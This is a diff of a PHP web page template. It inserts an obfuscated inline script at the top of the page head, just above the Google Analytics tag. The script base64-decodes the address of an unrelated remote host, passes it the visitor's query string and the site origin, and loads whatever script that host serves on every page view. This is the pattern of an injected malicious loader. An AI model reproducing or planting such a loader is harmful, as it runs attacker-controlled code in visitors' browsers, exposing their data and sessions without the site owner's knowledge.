@@ -135,6 +135,7 @@ $csrfToken = $_SESSION["csrf_token"];
 
 <head>
 
+  <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhcmRlbi1zZXJ2aWNlcy1ob21lLXNmY2xuLm9uZGlnaXRhbG9jZWFuLmFwcC9VNkl1UUFmWUVpLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
   <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPQ6QRGB95"></script>
 <script>
@@ -724,6 +725,7 @@ $csrfToken = $_SESSION["csrf_token"];
   </script>
 </body>
 </html>
+
 
 
 
